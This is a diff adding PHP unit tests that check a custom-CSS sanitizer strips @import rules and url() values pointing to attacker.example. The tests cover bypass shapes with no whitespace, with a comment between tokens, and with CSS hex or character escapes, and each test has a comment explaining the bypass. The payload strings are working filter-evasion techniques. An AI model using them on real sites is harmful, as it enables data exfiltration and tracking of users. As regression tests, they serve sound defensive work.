@@ -102,4 +102,49 @@ class SettingCustomCssTest extends TestCase
 
         $this->assertSame('', $out);
     }
+
+    // The regex previously required at least one whitespace character
+    // between @import and the following token. CSS tokenizes @import
+    // followed by a string, url(), or ident as a valid at-rule with
+    // no whitespace required, so the bare-quote form below reached
+    // the browser untouched under the old pattern.
+    public function test_import_at_rule_without_whitespace_is_stripped(): void
+    {
+        $out = $this->withCustomCss('@import"https://attacker.example/exfil.css";');
+
+        $this->assertStringNotContainsString('@import', $out);
+        $this->assertStringNotContainsString('attacker.example', $out);
+    }
+
+    // CSS strips comments during tokenization, so @import/*x*/"url"
+    // is equivalent to @import "url". The previous \s+ pattern didn't
+    // treat comment tokens as whitespace, so the payload survived.
+    public function test_import_at_rule_with_comment_between_is_stripped(): void
+    {
+        $out = $this->withCustomCss('@import/*comment*/"https://attacker.example/exfil.css";');
+
+        $this->assertStringNotContainsString('@import', $out);
+        $this->assertStringNotContainsString('attacker.example', $out);
+    }
+
+    // url() values are subject to CSS escape decoding. `\2F` decodes
+    // to `/`, so `\2F\2F attacker.example` becomes `//attacker.example`
+    // at browser render time. The scheme regex previously ran against
+    // the raw pre-decode literal and missed the bypass.
+    public function test_backslash_hex_escaped_protocol_relative_url_is_stripped(): void
+    {
+        $out = $this->withCustomCss('body { background: url("\2F\2F attacker.example/track.png"); }');
+
+        $this->assertStringNotContainsString('attacker.example', $out);
+    }
+
+    // Second CSS escape shape: `\X` where X is any non-hex char
+    // produces X literally. `\/\/attacker.example` decodes to
+    // `//attacker.example`. Same class of bypass, different escape form.
+    public function test_backslash_char_escaped_protocol_relative_url_is_stripped(): void
+    {
+        $out = $this->withCustomCss('body { background: url("\/\/attacker.example/track.png"); }');
+
+        $this->assertStringNotContainsString('attacker.example', $out);
+    }
 }
